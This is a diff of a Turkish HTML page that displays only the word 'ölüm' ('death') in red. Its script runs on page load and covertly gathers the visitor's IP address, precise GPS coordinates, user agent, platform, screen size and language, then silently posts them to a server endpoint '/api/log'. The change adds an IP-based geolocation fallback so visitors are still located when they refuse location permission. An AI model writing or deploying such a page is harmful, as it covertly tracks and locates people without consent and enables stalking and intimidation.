@@ -1,110 +1,193 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: black;
-            color: red;
-            font-size: 50px;
-            font-weight: bold;
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: black;
+      color: red;
+      font-size: 50px;
+      font-weight: bold;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
-    ölüm
+  ölüm
 
-    <script>
-        // IP'yi almak için
-        async function getUserIP() {
-            try {
-                const res = await fetch('https://api64.ipify.org?format=json'); 
-                const data = await res.json();
-                return data.ip;
-            } catch (error) {
-                console.error("IP alınırken hata oluştu:", error);
-                return "Bilinmeyen";
-            }
+  <script>
+    // 1) IP tabanlı konum sorgusu (fallback)
+    async function getIPLocation() {
+      try {
+        // ip-api.com -> JSON yanıt döndürür
+        // Ücretsiz sürümü HTTP olabilir; HTTPS'te çalışmayabilir. Alternatif: "https://ipwho.is/" vb.
+        const res = await fetch('http://ip-api.com/json/');
+        const data = await res.json();
+        // Örnek yanıt:
+        // {
+        //   "status":"success",
+        //   "country":"United States",
+        //   "countryCode":"US",
+        //   "region":"CA",
+        //   "regionName":"California",
+        //   "city":"San Francisco",
+        //   "lat":37.7749,
+        //   "lon":-122.4194,
+        //   "query":"xxx.xxx.xxx.xxx"
+        // }
+        if (data.status === "success") {
+          return {
+            ip: data.query || "Bilinmeyen IP",
+            latitude: data.lat || null,
+            longitude: data.lon || null,
+            city: data.city || "Bilinmeyen",
+            country: data.country || "Bilinmeyen"
+          };
+        } else {
+          // "fail" durumunda
+          return null;
         }
+      } catch (error) {
+        console.error("IP tabanlı konum alınırken hata oluştu:", error);
+        return null;
+      }
+    }
 
-        // Nominatim üzerinden enlem/boylam -> ülke/şehir
-        async function getLocationFromCoords(latitude, longitude) {
-            try {
-                // zoom=18 & addressdetails=1 ile daha detaylı veriler
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
-                const data = await res.json();
+    // 2) Kullanıcının gerçek IP'sini (api64.ipify.org) almak için (isteğe bağlı)
+    async function getUserIP() {
+      try {
+        const res = await fetch('https://api64.ipify.org?format=json'); 
+        const data = await res.json();
+        return data.ip;
+      } catch (error) {
+        console.error("IP alınırken hata oluştu:", error);
+        return "Bilinmeyen";
+      }
+    }
 
-                const country = data.address && data.address.country ? data.address.country : "Bilinmeyen";
-                const city = data.address && (data.address.city || data.address.town || data.address.village)
-                    ? (data.address.city || data.address.town || data.address.village)
-                    : "Bilinmeyen";
+    // 3) Enlem/boylam -> şehir/ülke (Nominatim) (GPS konumu için)
+    async function getLocationFromCoords(latitude, longitude) {
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+        const data = await res.json();
 
-                return { country, city };
-            } catch (error) {
-                console.error("GPS konum alınırken hata oluştu:", error);
-                return { country: "Bilinmeyen", city: "Bilinmeyen" };
-            }
-        }
+        const country = data.address?.country || "Bilinmeyen";
+        const city = data.address?.city || data.address?.town || data.address?.village || "Bilinmeyen";
+        return { country, city };
+      } catch (error) {
+        console.error("GPS konum alınırken hata oluştu:", error);
+        return { country: "Bilinmeyen", city: "Bilinmeyen" };
+      }
+    }
 
-        // Tarayıcıdan (HTML5 Geolocation) enlem-boylam alma
-        function getGPSLocation() {
-            return new Promise((resolve) => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-                            const location = await getLocationFromCoords(latitude, longitude);
-                            resolve({ latitude, longitude, location });
-                        },
-                        (error) => {
-                            console.error("Konum izni reddedildi veya hata oluştu:", error);
-                            resolve(null);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                } else {
-                    console.error("Tarayıcı konum API'sini desteklemiyor.");
-                    resolve(null);
-                }
+    // 4) Yüksek hassasiyetle tarayıcı konumunu iste -> Başarısızsa IP fallback
+    function getGPSLocationWithFallback() {
+      return new Promise(async (resolve) => {
+        // Tarayıcı geolocation destekliyorsa:
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              // Başarılı: GPS'ten enlem-boylam aldık
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              // Nominatim'den şehir/ülke
+              const loc = await getLocationFromCoords(latitude, longitude);
+              resolve({
+                success: true,
+                latitude,
+                longitude,
+                city: loc.city,
+                country: loc.country
+              });
+            },
+            async (error) => {
+              console.warn("Konum izni reddedildi veya hata oluştu:", error);
+              // HATA -> IP tabanlı konuma fallback
+              const ipLoc = await getIPLocation();
+              if (ipLoc) {
+                resolve({
+                  success: false,
+                  latitude: ipLoc.latitude,
+                  longitude: ipLoc.longitude,
+                  city: ipLoc.city,
+                  country: ipLoc.country,
+                  ip: ipLoc.ip
+                });
+              } else {
+                // IP de alınamadıysa
+                resolve(null);
+              }
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } else {
+          console.error("Tarayıcı geolocation API'sini desteklemiyor. IP tabanlı konuma geçiliyor.");
+          // Geolocation desteklenmiyorsa IP fallback
+          const ipLoc = await getIPLocation();
+          if (ipLoc) {
+            resolve({
+              success: false,
+              latitude: ipLoc.latitude,
+              longitude: ipLoc.longitude,
+              city: ipLoc.city,
+              country: ipLoc.country,
+              ip: ipLoc.ip
             });
+          } else {
+            resolve(null);
+          }
         }
+      });
+    }
 
-        // IP + Konum bilgilerini toplayıp sunucuya POST etme
-        async function sendData() {
-            const ip = await getUserIP();
-            const locationData = await getGPSLocation();
+    // 5) Tüm verileri birleştirip sunucuya gönder
+    async function sendData() {
+      // Tarayıcı konumu veya IP fallback
+      const locationData = await getGPSLocationWithFallback();
 
-            let userData = {
-                ip: ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                language: navigator.language,
-                location: locationData
-                    ? `${locationData.location.city}, ${locationData.location.country}`
-                    : "Konum alınamadı",
-                latitude: locationData ? locationData.latitude : null,
-                longitude: locationData ? locationData.longitude : null
-            };
+      // "Gerçek IP" sorgusu (isteğe bağlı). IP tabanlı konumla gelen IP ile farklı olabilir.
+      const userIP = await getUserIP();
 
-            fetch('/api/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(userData)
-            });
-        }
+      // Varsayılan
+      let finalLocation = "Konum alınamadı";
+      let lat = null;
+      let lon = null;
 
-        // Sayfa açılınca konum isteyip sunucuya kaydet
-        sendData();
-    </script>
+      if (locationData) {
+        // "Şehir, Ülke" formatı
+        finalLocation = `${locationData.city}, ${locationData.country}`;
+        lat = locationData.latitude;
+        lon = locationData.longitude;
+      }
+
+      let userData = {
+        ip: userIP,  // ipify'den gelen IP
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        language: navigator.language,
+        location: finalLocation,
+        latitude: lat,
+        longitude: lon
+      };
+
+      // Sunucuya POST
+      fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(userData)
+      });
+    }
+
+    // Sayfa açıldığında çalıştır
+    sendData();
+  </script>
 </body>
 </html>
